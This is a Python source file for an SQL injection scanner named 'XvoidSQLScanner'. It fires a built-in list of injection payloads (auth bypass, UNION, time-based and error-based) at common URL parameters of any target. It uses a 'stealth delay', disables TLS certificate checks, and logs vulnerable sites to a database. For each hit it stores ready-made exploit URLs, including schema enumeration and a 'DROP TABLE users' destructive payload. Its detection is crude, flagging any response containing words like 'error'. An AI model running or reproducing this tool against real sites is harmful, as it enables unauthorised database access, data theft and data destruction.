import socket
import sqlite3
import time
import ssl
from urllib.parse import urlparse, quote
from colorama import Fore, Style

class XvoidSQLScanner:
    def __init__(self):
        self.db_name = 'xvoid_scans.db'
        self.init_database()
        self.load_resources()
        
    def load_resources(self):
        # Load parameters
        try:
            with open('params.txt', 'r') as f:
                self.params = [line.strip() for line in f if line.strip()]
        except:
            self.params = ['id', 'user', 'page', 'search', 'q', 'cat', 'product', 'name']
        
        # Load payloads
        try:
            with open('payloads.txt', 'r') as f:
                self.payloads = [line.strip() for line in f if line.strip()]
        except:
            self.payloads = [
                "' OR '1'='1",
                "' UNION SELECT null,@@version,null--",
                "'; WAITFOR DELAY '00:00:05'--",
                "' OR SLEEP(5)--",
                "' AND 1=CONVERT(int,@@version)--",
                "' OR 1=1--",
                "admin'--",
                "' OR 'a'='a",
                "\" OR \"1\"=\"1",
                "' UNION SELECT 1,2,3,4,5--"
            ]
    
    def init_database(self):
        conn = sqlite3.connect(self.db_name)
        cursor = conn.cursor()
        cursor.execute('''CREATE TABLE IF NOT EXISTS scans
                         (id INTEGER PRIMARY KEY AUTOINCREMENT,
                          target TEXT,
                          vulnerable INTEGER,
                          parameter TEXT,
                          payload TEXT,
                          response TEXT,
                          timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
        cursor.execute('''CREATE TABLE IF NOT EXISTS exploits
                         (id INTEGER PRIMARY KEY AUTOINCREMENT,
                          scan_id INTEGER,
                          exploit_url TEXT,
                          type TEXT,
                          FOREIGN KEY(scan_id) REFERENCES scans(id))''')
        conn.commit()
        conn.close()
    
    def save_result(self, target, vulnerable, parameter, payload, response):
        conn = sqlite3.connect(self.db_name)
        cursor = conn.cursor()
        cursor.execute('''INSERT INTO scans (target, vulnerable, parameter, payload, response)
                          VALUES (?, ?, ?, ?, ?)''',
                       (target, 1 if vulnerable else 0, parameter, payload, response))
        
        scan_id = cursor.lastrowid
        
        if vulnerable:
            exploit_url = f"{target}?{parameter}={quote(payload)}"
            cursor.execute('''INSERT INTO exploits (scan_id, exploit_url, type)
                              VALUES (?, ?, ?)''',
                           (scan_id, exploit_url, 'SQL Injection'))
        
        conn.commit()
        conn.close()
        return scan_id
    
    def create_socket(self, host, port, is_https):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        
        if is_https:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            sock = context.wrap_socket(sock, server_hostname=host)
        
        sock.connect((host, port))
        return sock
    
    def send_payload(self, url, param, payload):
        try:
            parsed = urlparse(url)
            host = parsed.netloc
            path = parsed.path if parsed.path else "/"
            
            # Determine port and protocol
            if parsed.scheme == 'https':
                port = 443
                is_https = True
            else:
                port = 80
                is_https = False
            
            # Add port if specified
            if ':' in host:
                host, port_str = host.split(':')
                port = int(port_str)
            
            # Create HTTP request
            encoded_payload = quote(payload)
            query = f"{param}={encoded_payload}"
            
            request = f"GET {path}?{query} HTTP/1.1\r\n"
            request += f"Host: {host}\r\n"
            request += "User-Agent: Mozilla/5.0 (X-Void-Scanner/3.0)\r\n"
            request += "Accept: */*\r\n"
            request += "Connection: close\r\n\r\n"
            
            # Send via socket
            sock = self.create_socket(host, port, is_https)
            sock.send(request.encode())
            
            # Receive response
            response = b""
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except socket.timeout:
                    break
            
            sock.close()
            
            response_text = response.decode('utf-8', errors='ignore')
            
            # Check for SQL errors
            sql_errors = [
                'sql', 'mysql', 'postgresql', 'oracle',
                'syntax', 'error', 'warning', 'exception',
                'unclosed', 'quotation', 'statement',
                'odbc', 'driver', 'oledb', 'pdo'
            ]
            
            for error in sql_errors:
                if error in response_text.lower():
                    return True, response_text[:500]
            
            # Check for time delay (blind SQL)
            return False, response_text[:500]
            
        except Exception as e:
            return None, f"Error: {str(e)}"
    
    def scan_target(self, target_url):
        print(f"\n{Fore.RED}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.RED}[>] TARGET: {target_url}{Style.RESET_ALL}")
        print(f"{Fore.RED}[>] Loading {len(self.payloads)} payloads...{Style.RESET_ALL}")
        
        vulnerabilities = []
        
        for param in self.params:
            print(f"\n{Fore.RED}[*] Testing parameter: {param}{Style.RESET_ALL}")
            
            for i, payload in enumerate(self.payloads, 1):
                print(f"{Fore.RED}[{i}/{len(self.payloads)}] Testing: {payload[:30]}...{Style.RESET_ALL}", end='\r')
                
                time.sleep(0.3)  # Stealth delay
                
                vulnerable, response = self.send_payload(target_url, param, payload)
                
                if vulnerable:
                    print(f"\n{Fore.RED}[!] VULNERABLE! Parameter: {param}{Style.RESET_ALL}")
                    print(f"{Fore.RED}[!] Payload: {payload}{Style.RESET_ALL}")
                    print(f"{Fore.RED}[!] Response snippet: {response[:100]}...{Style.RESET_ALL}")
                    
                    scan_id = self.save_result(target_url, True, param, payload, response)
                    vulnerabilities.append((param, payload, response, scan_id))
                    
                    # Generate exploit suggestions
                    self.generate_exploits(target_url, param, scan_id)
        
        print(f"\n{Fore.RED}{'='*60}{Style.RESET_ALL}")
        if vulnerabilities:
            print(f"{Fore.RED}[+] Found {len(vulnerabilities)} vulnerabilities{Style.RESET_ALL}")
            self.generate_report(target_url, vulnerabilities)
        else:
            print(f"{Fore.RED}[-] No vulnerabilities found{Style.RESET_ALL}")
        
        return vulnerabilities
    
    def generate_exploits(self, target_url, param, scan_id):
        conn = sqlite3.connect(self.db_name)
        cursor = conn.cursor()
        
        exploits = [
            (f"{target_url}?{param}=' UNION SELECT null,table_name,null FROM information_schema.tables--", "Database Enumeration"),
            (f"{target_url}?{param}=' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "Time-Based Blind"),
            (f"{target_url}?{param}=' OR 1=1; DROP TABLE users--", "Destructive Test"),
            (f"{target_url}?{param}=' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--", "Error-Based"),
        ]
        
        for exploit_url, exploit_type in exploits:
            cursor.execute('''INSERT INTO exploits (scan_id, exploit_url, type)
                              VALUES (?, ?, ?)''',
                           (scan_id, exploit_url, exploit_type))
        
        conn.commit()
        conn.close()
    
    def generate_report(self, target_url, vulnerabilities):
        print(f"\n{Fore.RED}[SECURITY REPORT]{Style.RESET_ALL}")
        print(f"{Fore.RED}Target: {target_url}{Style.RESET_ALL}")
        print(f"{Fore.RED}Vulnerabilities: {len(vulnerabilities)}{Style.RESET_ALL}")
        
        for i, (param, payload, response, scan_id) in enumerate(vulnerabilities, 1):
            print(f"\n{Fore.RED}[VULN {i}]{Style.RESET_ALL}")
            print(f"{Fore.RED}Parameter: {param}{Style.RESET_ALL}")
            print(f"{Fore.RED}Payload: {payload}{Style.RESET_ALL}")
            print(f"{Fore.RED}Evidence: {response[:200]}...{Style.RESET_ALL}")
    
    def view_results(self):
        conn = sqlite3.connect(self.db_name)
        cursor = conn.cursor()
        
        cursor.execute('''SELECT COUNT(*) FROM scans''')
        total_scans = cursor.fetchone()[0]
        
        cursor.execute('''SELECT COUNT(*) FROM scans WHERE vulnerable = 1''')
        total_vuln = cursor.fetchone()[0]
        
        print(f"\n{Fore.RED}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.RED}[SCAN DATABASE]{Style.RESET_ALL}")
        print(f"{Fore.RED}Total scans: {total_scans}{Style.RESET_ALL}")
        print(f"{Fore.RED}Vulnerable targets: {total_vuln}{Style.RESET_ALL}")
        
        if total_vuln > 0:
            cursor.execute('''SELECT s.target, s.parameter, s.payload, e.exploit_url
                              FROM scans s
                              LEFT JOIN exploits e ON s.id = e.scan_id
                              WHERE s.vulnerable = 1
                              ORDER BY s.timestamp DESC''')
            
            results = cursor.fetchall()
            
            print(f"\n{Fore.RED}[VULNERABLE TARGETS]{Style.RESET_ALL}")
            for target, param, payload, exploit_url in results:
                print(f"{Fore.RED}Target: {target}{Style.RESET_ALL}")
                print(f"{Fore.RED}Parameter: {param}{Style.RESET_ALL}")
                print(f"{Fore.RED}Payload: {payload}{Style.RESET_ALL}")
                if exploit_url:
                    print(f"{Fore.RED}Exploit: {exploit_url}{Style.RESET_ALL}")
                print()
        
        conn.close()
